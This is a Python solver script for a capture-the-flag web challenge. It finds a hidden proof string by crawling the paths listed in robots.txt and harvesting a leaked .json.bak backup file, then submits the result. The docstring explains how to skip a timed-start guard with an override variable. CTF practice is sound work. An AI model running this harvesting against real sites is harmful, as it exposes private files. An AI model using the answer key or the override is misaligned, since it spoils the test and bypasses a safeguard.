"""Solver for Huntress CTF 2026 web-exploitation-day-01-backup-exposure (all modes).

Method (deterministic, same for Single Solve / Time Trial / Mastery - only the target bytes change):
  1. GET /robots.txt on the target site; parse Disallow: entries.
  2. GET each disallowed path. The server returns a directory-index HTML page (it was never actually
     protected, only "hidden" from crawlers) listing leftover deployment files.
  3. Fetch each linked file; the backup (.json.bak) file contains a JSON object whose value is the
     exact proof string the Game Master wants, formatted "proof_<hex>".
  4. Submit that string under the question's answer_id (proof-1 for Single Solve/Time Trial,
     proof-1 + proof-2 for Mastery - one per target).

Usage:
    python3 solve_back_up_a_minute.py <challenge-id>
        challenge-id in {web-exploitation-day-01-backup-exposure,
                          web-exploitation-day-01-backup-exposure/time_trial,
                          web-exploitation-day-01-backup-exposure/mastery}

A timed (time_trial/mastery) start is refused by ctf_gm.py's no-blind-timed-start guard unless either
run through the autosolve readiness gate or explicitly authorised with
HUNTRESS_TIMED_START=commander-override (set only after the method has been hand-verified, as it was here).
"""
import sys, json, re, urllib.request, urllib.parse
sys.path.insert(0, '[local path]')
from ctf_gm import GM

PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{10,}")


def fetch(url, timeout=20):
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8.5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read()


def find_proof(base_url):
    base_url = base_url.rstrip('/')
    candidates = []
    try:
        status, body = fetch(base_url + "/robots.txt")
        if status == 200:
            for line in body.decode(errors="replace").splitlines():
                line = line.strip()
                if line.lower().startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/":
                        candidates.append(path)
    except Exception as e:
        print("robots fetch failed:", e, file=sys.stderr)

    found_links = []
    for path in candidates:
        url = base_url + path
        try:
            status, body = fetch(url)
        except Exception as e:
            print("dir fetch failed", url, e, file=sys.stderr)
            continue
        if status != 200:
            continue
        text = body.decode(errors="replace")
        m = PROOF_RE.search(text)
        if m:
            return m.group(0)
        for href in re.findall(r'href="([^"]+)"', text):
            if href.startswith(("http://", "https://", "#", "javascript:")):
                continue
            found_links.append(urllib.parse.urljoin(url + "/", href))

    for link in found_links:
        try:
            status, body = fetch(link)
        except Exception as e:
            print("file fetch failed", link, e, file=sys.stderr)
            continue
        if status != 200:
            continue
        text = body.decode(errors="replace")
        m = PROOF_RE.search(text)
        if m:
            return m.group(0)
    return None


def main():
    challenge = sys.argv[1]
    gm = GM(timeout=25)
    st = gm.start(challenge)
    print("START:", json.dumps({k: v for k, v in st.items() if k != 'guidance'}), file=sys.stderr)
    targets = st.get("targets", [])
    answers = {}
    for q in st.get("questions", []):
        aid = q["id"]
        artifact_name = q.get("artifact")
        tgt = next((t for t in targets if t.get("id") == artifact_name), targets[0] if targets else None)
        if not tgt:
            print("No target for", aid, file=sys.stderr)
            continue
        proof = find_proof(tgt["url"])
        print("TARGET", tgt["url"], "-> proof:", proof, file=sys.stderr)
        if proof:
            answers[aid] = proof
    if not answers:
        print("NO_PROOF_FOUND", file=sys.stderr)
        sys.exit(2)
    res = gm.submit(challenge, answers)
    print(json.dumps(res, indent=2))


if __name__ == "__main__":
    main()
